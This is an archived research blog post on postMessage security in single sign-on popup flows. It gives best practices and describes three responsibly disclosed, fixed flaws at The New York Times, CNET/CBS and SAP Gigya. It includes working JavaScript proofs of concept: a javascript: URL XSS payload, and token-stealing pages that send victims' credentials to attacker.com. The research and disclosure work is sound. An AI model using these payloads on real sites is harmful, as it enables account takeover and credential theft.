---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-22_security-and-privacy-of-social-logins-ii-postmessage-security-in-single-sign-on.md
original_filename: 2021-02-22_security-and-privacy-of-social-logins-ii-postmessage-security-in-single-sign-on.md
title: 'Security and Privacy of Social Logins (II): PostMessage Security in Single
  Sign-On '
category: blogs
detected_topics:
- sso
- oauth
- cors
- xss
- access-control
- command-injection
tags:
- imported
- blogs
- sso
- oauth
- cors
- xss
- access-control
- command-injection
language: en
raw_sha256: 1315fb30643c20975c033306e640af7bb46e7d024744b789663d65853cd05f18
text_sha256: 5a4c4a6bf33b6d0159d061f580f9bfc5b435512dd1f2242237efd59feb1cfbd6
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# Security and Privacy of Social Logins (II): PostMessage Security in Single Sign-On 

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-22_security-and-privacy-of-social-logins-ii-postmessage-security-in-single-sign-on.md
- Source Type: markdown
- Detected Topics: sso, oauth, cors, xss, access-control, command-injection
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `1315fb30643c20975c033306e640af7bb46e7d024744b789663d65853cd05f18`
- Text SHA256: `5a4c4a6bf33b6d0159d061f580f9bfc5b435512dd1f2242237efd59feb1cfbd6`


## Content

---
title: "Security and Privacy of Social Logins (II): PostMessage Security in Single Sign-On "
page_title: "On Web-Security and -Insecurity: Security and Privacy of Social Logins (II): PostMessage Security in Single Sign-On"
url: "https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part2.html"
final_url: "https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part2.html"
authors: ["Louis Jannett (@iphoneintosh)"]
programs: ["SAP", "The New York Times", "CNET"]
bugs: ["DOM XSS", "postMessage", "DOM XSS"]
publication_date: "2021-02-22"
added_date: "2023-01-09"
source: "pentester.land/writeups.json"
original_index: 3872
---

This post is the  _second out of three blog posts_ summarizing my (Louis Jannett) research on the design, security, and privacy of real-world Single Sign-On (SSO) implementations. It is based on my [master's thesis](https://www.nds.ruhr-uni-bochum.de/media/nds/arbeiten/2020/10/29/Masterarbeit_Louis_Jannett_Security_and_Privacy_of_Social_Logins.pdf) that I wrote between April and October 2020 at the [Chair for Network and Data Security](https://www.nds.ruhr-uni-bochum.de/chair/).

We structured this blog post series into three parts according to the [research questions of my master's thesis](https://www.nds.ruhr-uni-bochum.de/media/nds/arbeiten/2020/10/29/Masterarbeit_Louis_Jannett_Security_and_Privacy_of_Social_Logins.pdf#page=22): Single Sign-On Protocols in the Wild, PostMessage Security in Single Sign-On, and Privacy in Single Sign-On Protocols.

## Overview

#### [Part I: Single Sign-On Protocols in the Wild](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part1.html)

Although previous work uncovered various security flaws in SSO, it did not work out uniform protocol descriptions of real-world SSO implementations. We summarize our in-depth analyses of Apple, Google, and Facebook SSO. We also refer to the sections of the [thesis](https://www.nds.ruhr-uni-bochum.de/media/nds/arbeiten/2020/10/29/Masterarbeit_Louis_Jannett_Security_and_Privacy_of_Social_Logins.pdf#page=61) that provide more detailed insights into the protocol flows and messages.

#### [Part II: PostMessage Security in Single Sign-On](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part2.html)

It turned out that the postMessage API is commonly used in real-world SSO implementations. We introduce the reasons for this and propose security best practices on how to implement postMessage in SSO. Further, we present vulnerabilities on top-visited websites that caused DOM-based XSS and account takeovers due to insecure use of postMessage in SSO.

  * Vuln. 1) DOM-based XSS on myaccount.nytimes.com
  * Vuln. 2) Account Takeover on cbsnews.com, cnet.com, and zdnet.com
  * Vuln. 3) Account Takeover in SAP Customer Data Cloud (GIGYA)

#### [Part III: Privacy in Single Sign-On Protocols (coming soon)  
](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)

Identity Providers (IdPs) use "zero-click" authentication flows to automatically sign in the user on the Service Provider (SP) once it is logged in on the IdP and has consented. We show that these flows can harm user privacy and enable new targeted deanonymization attacks of the user's identity.

## PostMessage Security in Single Sign-On

If you are familiar with OAuth or OpenID Connect, you already know the _redirect flow_ : It opens the Authentication Request in the primary window and returns the Authentication Response with a redirect from the IdP to the SP. This approach requires the browser to reload the entire SP website, which is especially in [single-page applications](https://developer.mozilla.org/en-US/docs/Glossary/SPA) a disadvantage.

  

The _popup flow_ eliminates the need to reload the SP website by executing the SSO flow in a popup window as follows:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRYlwe9SyJ-_w3MaRl0EMF1eyJKnfGNs-6N8kZLaCH79el4VyH-wBuaaI66ETy_WFsl56PYlR2dXK6F6WPjf364flTwyxyW-LLqvj2kxT0g8VpRs_oMFiyIYl5xrVSuOD8TQ9aw5ZPdMGK/w640-h227/4_popup_flow.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRYlwe9SyJ-_w3MaRl0EMF1eyJKnfGNs-6N8kZLaCH79el4VyH-wBuaaI66ETy_WFsl56PYlR2dXK6F6WPjf364flTwyxyW-LLqvj2kxT0g8VpRs_oMFiyIYl5xrVSuOD8TQ9aw5ZPdMGK/s2977/4_popup_flow.png)

  

If the sign-in button on the SP website is clicked, the Authentication Request is opened in a new popup window. After the user submits its credentials and grants the consent, the IdP redirects the popup to the `redirect_uri`. From the IdP's perspective, a normal redirect flow is executed. Thus, the IdP does not need not implement any changes to support the popup flow. The SP receives the `code` at its Redirection Endpoint, redeems the `code`, authenticates the user, and finally returns JavaScript that sends an authentication token back to the primary window with postMessage. For instance, the response from the Redirection Endpoint sends the `access_token` (or `id_token` or any other application-specific token) from the popup window back to the primary window as follows:
  
  
  const access_token = "ya29.a0Af...";
  window.opener.postMessage(access_token, "https://sp.com");
  

  

Prior to that, the following JavaScript is executed in the primary window:

  

  
  
  window.onmessage = (event) => {
  if (event.origin !== "https://sp.com") return;
  processToken(event.data);
  }
  

  

Finally, the primary window receives the authentication token, optionally stores it in localStorage, and may use it for subsequent API calls.

### Comparison: response_mode=web_message vs. popup flow

We discovered the popup flow in several real-world SSO implementations, although it is not formally defined in the OAuth or OpenID Connect specifications. Besides the response modes `query`, `fragment`, and `form_post`, we want to raise awareness for `response_mode=web_message`. This response mode requests not to perform any redirects but instead use the postMessage API. After the user submits its credentials and grants the consent, the IdP returns JavaScript, sending the Authentication Response from the popup window to the primary window using postMessage: `window.opener.postMessage("code=XYZ&state=123", "https://sp.com/redirect")`. Although the `redirect_uri` is not required to perform any redirects, it still serves as postMessage destination origin. The SP benefits from this response mode since it does not have to implement a Redirection Endpoint, which is useful for "real" [single-page applications](https://developer.mozilla.org/en-US/docs/Glossary/SPA). However, the IdP must make changes to its implementation.

  

Although the `web_message` response mode is not formally specified in current OAuth or OpenID Connect standards, it still is defined in an expired draft from 2016: [OAuth 2.0 Web Message Response Mode](https://tools.ietf.org/html/draft-sakimura-oauth-wmrm-00). Also, the current draft [OAuth 2.0 Assisted Token](https://tools.ietf.org/html/draft-ideskog-assisted-token-04) proposes a separate endpoint used by postMessage SSO flows that are executed with iframes in [single-page applications](https://developer.mozilla.org/en-US/docs/Glossary/SPA). The [OAuth 2.0 Multiple Response Type Encoding Practices](https://openid.net/specs/oauth-v2-multiple-response-types-1_0.html) document leaves space for future specifications as well:

  

_> Note that it is expected that additional Response Modes may be defined by other specifications in the future, including possibly ones utilizing the HTML5 postMessage API and Cross-Origin Resource Sharing (CORS). _

 _Source:[OAuth 2.0 Multiple Response Type Encoding Practices](https://openid.net/specs/oauth-v2-multiple-response-types-1_0.html)_

### Security

The postMessage API has not only enjoyed popularity by developers but also by bug bounty hunters. The reason is simple: It provides a controlled circumvention of the Same Origin Policy and enables frames of different origins to communicate with each other. This comes at a cost: Developers need to meet specific security requirements to mitigate cross-origin attacks:

#### Destination Check

The origin of the window that receives the postMessage must be specified in the second parameter of the `postMessage` function. If the message is confidential (i.e., contains the `access_token`, `id_token`, or similar), the wildcard origin `*` _must not_ be used. Instead, the SP origin (i.e., the `redirect_uri`) must be explicitly specified as destination origin. Insufficient destination checks can cause account takeovers.

#### Origin Check

In the postMessage event listener, the origin of the received postMessage must be checked before the payload is processed. The safest option is to perform a static string compare on the `event.origin` property. Developers need to pay special attention to regular expressions. For instance, `/^https?:\/\/.*sp\\.com$/` is _insecure_ , since it classifies `https://attackersp.com` as valid. Insufficient origin checks can cause DOM-based XSS, CSRF logins, and CSRF account linking.

#### Input Validation

In the postMessage event listener, the message must be validated before it is processed. For instance, let's assume the URL <https://sp.com/login> is sent with postMessage to an event listener, which navigates to that URL by setting the `window.location.href` property. If the URL is not validated, a maliciously-crafted URL (i.e., `javascript:alert(1)`) will cause DOM-based XSS.

#### Evaluation

We were curious about the security of postMessage in SSO flows on real-world SPs. To evaluate the current state of postMessage in SSO, the top 250 websites from [Moz's list](https://moz.com/top500) of the most popular websites served as a foundation. 

We identified 63 websites supporting SSO with Apple, Google, or Facebook. Out of 15 websites implementing the popup flow with postMessage, we found that _ten are vulnerable to an account takeover_ and _two are vulnerable to DOM-based XSS_. 

In the following, we present three vulnerabilities on real-world SPs. Check out [Section 4.5 of the thesis](https://www.nds.ruhr-uni-bochum.de/media/nds/arbeiten/2020/10/29/Masterarbeit_Louis_Jannett_Security_and_Privacy_of_Social_Logins.pdf#page=99) for more details and attacks.

  

### Vuln. 1) DOM-based XSS on myaccount.nytimes.com

The website [myaccount.nytimes.com](http://myaccount.nytimes.com) was vulnerable to DOM-based XSS due to a missing postMessage origin check and insufficient input validation within the postMessage event listener.

  

The SSO flow on [nytimes.com](http://nytimes.com) works as follows: If the user clicks the sign-in button on <https://myaccount.nytimes.com/auth/login>, the Authentication Request is opened in a new popup window. The user signs in, grants the consent, and the popup is redirected to the Redirection Endpoint on <https://myaccount.nytimes.com/auth/google-login-callback?code=XYZ>. The backend receives the code, redeems the code, authenticates the user, sets session cookies, and returns JavaScript that sends a postMessage containing a target URL to which the primary window should redirect after successful authentication.

Therefore, the primary window on <https://myaccount.nytimes.com/auth/login> registered the following (vulnerable) event listener:
  
  
  // webpack:///./jsx/src/unified-lire/lire-ui-bundle/components/fullPage/FullPageView.js
  handleSsoPopupMessage = (e) => {
  const payload = receivePostMessage(e);
  if (payload.message == "SSO_ACTION_SUCCESS") {
  window.top.location.href = payload.props.redirectUri;
  }
  }
  
  // webpack:///./jsx/src/utils/iFramePostMessages.js
  receivePostMessage = (e) => {
  if (isNytimesDomain(e.origin)) return e.data;
  }
  isNytimesDomain = () => true;
  

  

As you might have noticed, the event listener wants to validate the origin of the postMessage with the `isNytimesDomain` function, which returns `true` for all origins. Then, it redirects to the URL sent in the postMessage by setting the `window.top.location.href` property, but without validating the URL. We can use the `javascript` scheme to achieve DOM-based XSS. Therefore, the attacker embeds the following PoC on its malicious website:
  
  
  window.popup = window.open("https://myaccount.nytimes.com/auth/login", "_blank");
  setTimeout( () => {
  window.popup.postMessage({
  "message": "SSO_ACTION_SUCCESS",
  "props": {
  "oauthProvider": "google",
  "redirectUri": "javascript:alert(document.domain)",
  "action": "LOGIN"
  }
  }, "*");
  }, 2000);
  

#### Responsible Disclosure

  * **2020-08-27** : Initial report sent to The New York Times via [HackerOne Disclosure Assistance](https://hackerone.com/disclosure-assistance?type=team)
  * **2020-09-09** : Acknowledged by [HackerOne](https://hackerone.com)
  * **2020-11** : Fixed with a domain whitelist: `["nytimes.com", "captcha-delivery.com", "localhost"].includes(...)`

### Vuln. 2) Account Takeover on cbsnews.com, cnet.com, and zdnet.com

The websites [cbsnews.com](http://cbsnews.com), [cnet.com](http://cnet.com), and [zdnet.com](http://zdnet.com) are brands of the [CBS Interactive group](https://cbsinteractive.com) and were vulnerable to a full account takeover due to an insufficient destination check in the `postMessage` function. Since the websites use a common authentication system, all three websites (and even more) were equally vulnerable.

In the following, we demonstrate the attack applied on [cnet.com](http://cnet.com):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMXIhXl__JgnzB6AxEGdy9bRPoGkXkh1Z4-BF60BYfK-rfnmu6DIYnlPi03B49GGG5hls1X1mCSG-Nw0XNPRya1vSL4Ic0cCYC0genEMm5aZGtFImB-t9dyKg_1AFGMh_0LFIHC_AHHc-9/w640-h234/4_cbsinteractive.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMXIhXl__JgnzB6AxEGdy9bRPoGkXkh1Z4-BF60BYfK-rfnmu6DIYnlPi03B49GGG5hls1X1mCSG-Nw0XNPRya1vSL4Ic0cCYC0genEMm5aZGtFImB-t9dyKg_1AFGMh_0LFIHC_AHHc-9/s1339/4_cbsinteractive.png)

  
The SSO flow on [cnet.com](http://cnet.com) involves a popup window and an iframe on the primary window. The iframe loads the [easyXDM library](https://github.com/oyvindkinsey/easyXDM), which is (insecurely) used as a proxy between the popup window and the primary window.

  

If the user clicks the "Continue with Facebook" button on [cnet.com](http://cnet.com), the Login Endpoint is opened in a new popup window. In return, it redirects the Authentication Request to Facebook. The user signs in, grants the consent, and the popup is redirected to the Redirection Endpoint. The backend receives the code, redeems it, creates a custom `accessCredential`, and returns JavaScript that calls the `setAccessCredentials` function in the iframe. The `accessCredential` is passed as a parameter to that function such that the iframe receives it. Note that this JavaScript callback only works because the iframe and popup window share the same origin.

Finally, the proxy iframe relays the `accessCredential` to the primary window using postMessage. The postMessage destination origin is retrieved from the `xdm_e` query parameter of the iframe URL. Note that this parameter is not validated, which is the core vulnerability in this flow.

To exploit this vulnerability, an attacker registers a postMessage event listener that will later receive the victim's `accessCredential` on its malicious website. It then embeds the proxy iframe and loads it with the `xdm_e=https://attacker.com` query parameter. Finally, the URL that starts the SSO flow is opened in a new popup window.
  
  
  window.addEventListener("message", (e) => { alert(e.data); });
  
  window.iframe = document.createElement("iframe");
  window.iframe.name = "easyXDM";
  window.iframe.src = "https://urs.cnet.com/pageservices/social/oauth/proxy?xdm_e=https%3A%2F%2Fattacker.com&xdm_c=urs375&xdm_p=1";
  window.iframe.onload = () => {
  window.open("https://urs.cnet.com/pageservices/social/oauth/connect/facebook/375?extras=%7B%22requestType%22%3A%22SOCIAL_AUTH%22%2C%22version%22%3A%22v2.2%22%7D&frameId=easyXDM", "_blank");
  }
  

  

If the victim visits the malicious website, is logged in on Facebook, and has valid consent for `cnet.com`, the malicious website automatically receives the victim's `accessCredential`, enabling the attacker to gain access to the victim's account.

#### Responsible Disclosure

  * **2020-08-09** : Initial report sent to [support.cnet@cbsinteractive.com](mailto:support.cnet@cbsinteractive.com)
  * **2020-08-11** : Acknowledged by CNET Customer Support
  * **2020-08-28** : Fix provided with an access control list containing insecure regular expressions: `/^.*\\.cnet\\.com((\/.*)?)$/` is valid for `xdm_e=https://attacker.com/.cnet.com`
  * **2020-08-28** : Second report sent to [support.cnet@cbsinteractive.com](mailto:support.cnet@cbsinteractive.com)
  * **2020-08-29** : Acknowledged by CNET Customer Support
  * **2020-09-04** : Fix provided with secure regular expressions: `/^(https:\/\/)([a-zA-Z0-9\\-]+\\.)*cnet\\.com((\/.*)?)$/`

### Vuln. 3) Account Takeover in SAP Customer Data Cloud (GIGYA)

The SAP Customer Data Cloud, formally known as [GIGYA](https://www.sap.com/acquired-brands/what-is-gigya.html), offers SSO as a Service: It acts both as IdP for its customers and SP for Google, Facebook, and other public IdPs. For instance, [www.independent.co.uk](http://www.independent.co.uk) and [abc.es](http://abc.es) integrate the SAP IdP to offer both Google and Facebook SSO with a single codebase.

We discovered a vulnerability in the postMessage configuration that led to an account takeover on all websites integrating the SAP identity brokerage service for SSO.

We demonstrate the attack applied on [www.independent.co.uk](http://www.independent.co.uk) as follows:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5X0WUkMMHeNuUtOTtb3i9dIfK4wUuvmSdoQdXEfVP_YDcAOPz7Xt5NOtX7B0xUaOtCbmhWOUEYU3g7bol0qwZCWKw9R3LJix-xjfMujNQz_dRYFGPmvLGwqWHlwjf5LA7ip75qhmA_2Y6/w640-h290/4_sap.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5X0WUkMMHeNuUtOTtb3i9dIfK4wUuvmSdoQdXEfVP_YDcAOPz7Xt5NOtX7B0xUaOtCbmhWOUEYU3g7bol0qwZCWKw9R3LJix-xjfMujNQz_dRYFGPmvLGwqWHlwjf5LA7ip75qhmA_2Y6/s1192/4_sap.png)

  

The SSO flow is started from the SP website by opening the Authentication RequestSAP in a new popup window. This request defines the public IdP (Google) and the domain of the SP website that will finally receive the tokens from the SAP IdP. This domain is not validated correctly: It rejects trivial manipulations (i.e., `domain=https://attacker.com` or `domain=https://www.independent.co.uk.attacker.com`) but fails to detect the `user:pwd@host.com` Basic Authentication URI component.

  

Thus, an attacker can create a malicious website that opens the Authentication RequestSAP in a new popup window, sets the `client_id` to some targeted SP, and the domain to the URL of that SP with an appended `@attacker.com`. The SAP IdP generates an Authentication RequestGoogle and redirects the popup to that URL. It further associates the `domain` with the `state`. Note that from Google's perspective, the SP is the SAP IdP. After authentication and consent, Google redirects back to the Redirection EndpointSAP. The SAP IdP receives the `code`, redeems it at Google, authenticates the user, creates custom authentication tokens, and finally returns JavaScript, which uses postMessage to return the custom authentication tokens to the SP. Note that the postMessage destination origin is set to the initial domain parameter: `https://[...]@attacker.com`. The backend uses the `state` to retrieve the associated `domain`.

  

If a victim visits the malicious website, is logged in at Google, and has valid consent, the attacker can immediately receive the tokens from SAP that authenticate the victim on the targeted SP:
  
  
  window.addEventListener("message", (e) => { alert(e.data);});
  window.open("https://socialize.us1.gigya.com/socialize.login?x_provider=googleplus&client_id=2_bkQWNsWGVZf-fA4GnOiUOYdGuROCvoMoEN4WMj6_YBq4iecWA-Jp9D2GZCLbzON4&redirect_uri=%2FGS%2FAfterLogin.aspx&response_type=server_token&state=domain%3Dhttps%253A%252F%252Fwww.independent.co.uk:pwd@attacker.com", "_blank");
  

  

#### Responsible Disclosure

  * **2020-08-05** : Initial report sent to [Secure@sap.com](mailto:Secure@sap.com)
  * **2020-08-18** : Acknowledged by SAP
  * **2020-09-17** : Fixed validation on backend server

## Acknowledgments

My thesis was supervised by [Christian Mainka](https://twitter.com/CheariX), [Vladislav Mladenov](https://twitter.com/v_mladenov), and [Jörg Schwenk](https://twitter.com/JoergSchwenk). Huge "thank you" for your continuous support, advice, and dozens of helpful tips. 

Also, special thanks to [Lauritz](https://twitter.com/_lauritz_) for his feedback on this post and valuable discussions during the research. Check out his blog post series on [Real-life OIDC Security](https://security.lauritz-holtmann.de/post/sso-security-overview/) as well.

  

## Authors of this Post

Louis Jannett
